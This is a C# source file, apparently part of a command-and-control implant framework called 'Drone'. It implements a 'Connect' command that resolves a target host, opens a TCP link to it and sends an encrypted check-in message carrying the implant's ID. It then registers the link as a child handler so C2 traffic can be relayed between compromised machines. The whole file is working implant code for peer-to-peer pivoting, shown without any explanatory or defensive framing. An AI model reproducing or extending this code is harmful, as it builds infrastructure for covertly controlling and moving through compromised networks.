using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

using Drone.Handlers;
using Drone.Models;

namespace Drone.Commands;

public sealed class Connect : DroneCommand
{
    public override byte Command => 0x1F;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        if (!IPAddress.TryParse(task.Arguments[0], out var address))
        {
            var lookup = await Dns.GetHostAddressesAsync(task.Arguments[0]);
            address = lookup.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
        }

        // bail if we couldn't get the IP
        if (address is null)
        {
            await Drone.SendError(task, "Could not resolve hostname");
            return;
        }
            
        var port = int.Parse(task.Arguments[1]);
        
        var handler = new TcpHandler(address, port);
        await handler.Connect();
        
        Drone.AddChildHandler(handler);
        
        // check-in task
        var tasks = new DroneTask[]
        {
            new()
            {
                Id = task.Id,
                Command = 0x01,
                Arguments = new[] { Drone.Metadata.Id }    
            }
        };

        var enc = Crypto.EncryptObject(tasks);
        
        await handler.SendMessages(new[]
        {
            new C2Message
            {
                Iv = enc.iv,
                Data = enc.data,
                Checksum = enc.checksum
            }
        });

        try
        {
            // blocks
            await handler.Start();
            await Drone.SendTaskComplete(task);
        }
        catch (Exception e)
        {
            await Drone.SendError(task, e.Message);
        }
        finally
        {
            Drone.RemoveChildHandler(handler);
        }
    }
}